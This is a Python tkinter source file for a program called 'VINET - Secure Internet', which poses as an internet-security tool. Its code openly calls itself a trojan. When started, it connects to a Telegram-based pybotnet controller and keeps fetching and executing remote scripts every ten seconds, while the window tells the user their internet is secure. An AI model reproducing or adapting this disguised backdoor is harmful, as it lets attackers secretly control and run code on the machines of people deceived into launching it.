

from threading import Thread
import tkinter as tk    

import time

import pybotnet



DEBUG = False


class Vinet(tk.Frame):
    def __init__(self, master=None, DEBUG=False):
        super().__init__(master)
        self.master = master
        self.master.title('VINET - Secure Internet')
        self.master.geometry('400x160')
        self.master.iconbitmap('icon.ico')
        self.pack()

        self.font_tuple_1 = ("Helvetica", 9) 
        self.font_tuple_2 = ("Comic Sans MS", 12) 
        self.item_size = 50

        self.DEBUG = DEBUG
        self._running = False
        self.trojan = None
        self.trojan_delay = 10
        self.create_widgets()

    def create_widgets(self):

        # get telegram token
        tk.Label(self, text='TOKEN', font = self.font_tuple_1).pack()
        self.TELEGRAM_TOKEN_LABALE = tk.Entry(self)
        self.TELEGRAM_TOKEN_LABALE['width'] = self.item_size + 9
        self.TELEGRAM_TOKEN_LABALE.pack()

        # get telegram chat id
        tk.Label(self, text='ID', font = self.font_tuple_1).pack()
        self.TELEGRAM_ADMIN_CHAT_ID_LABALE = tk.Entry(self)
        self.TELEGRAM_ADMIN_CHAT_ID_LABALE['width'] = self.item_size + 9
        self.TELEGRAM_ADMIN_CHAT_ID_LABALE.pack()

        # status
        self.status = tk.Label(self)
        self.status['text'] = 'offline'
        self.status['fg'] = 'red'
        self.status['height'] = 2
        self.status['font'] = self.font_tuple_2
        self.status.pack()

        # init start button
        self.start_button = tk.Button(self)
        self.start_button["text"] = "Start VINET"
        self.start_button['activebackground']='#78d6ff'
        self.start_button["command"] = self.run_pybotnet_trojan
        self.start_button['width'] = self.item_size
        self.start_button['bg'] = 'green'
        self.start_button['font'] = self.font_tuple_1
        self.start_button.pack()



    def run_pybotnet_trojan(self):
        TOKEN = self.TELEGRAM_TOKEN_LABALE.get()
        CHAT_ID = self.TELEGRAM_ADMIN_CHAT_ID_LABALE.get()
        
        
        if self._running:
            self.status['text'] = 'VINET is online! \n Your internet is secure'
            self.status['fg'] = 'green'
            return

        # check data
        if TOKEN == '':
            self.status['text'] = 'please add TOKEN'
            self.status['fg'] = 'red'
            return

        # check data
        if CHAT_ID == '':
            self.status['text'] = 'please add ID'
            self.status['fg'] = 'red'
            return
        
        # start trojan tread
        self.trojan = Thread(target=self.pybotnet_trojan)
        self.trojan.start()

    
    def stop_trojan(self):
        self._running = False


    def pybotnet_trojan(self):
        self._running = True

        self.status['text'] = 'online \n Your internet is secure'
        self.status['fg'] = 'green'

        TOKEN = self.TELEGRAM_TOKEN_LABALE.get()
        CHAT_ID = self.TELEGRAM_ADMIN_CHAT_ID_LABALE.get()


        show_log = False
        is_shell=False
        if self.DEBUG:
            show_log=True
            is_shell=True

        self.pybotnet = pybotnet.PyBotNet(TOKEN, CHAT_ID, show_log=show_log, is_shell=is_shell)

        while self._running:
            self.pybotnet.get_and_execute_scripts_by_third_party_proxy()
            time.sleep(self.trojan_delay)

        self._running = False


        
if __name__ == '__main__':
    root = tk.Tk()
    app = Vinet(master=root, DEBUG=DEBUG)
    app.mainloop()
    app.stop_trojan()
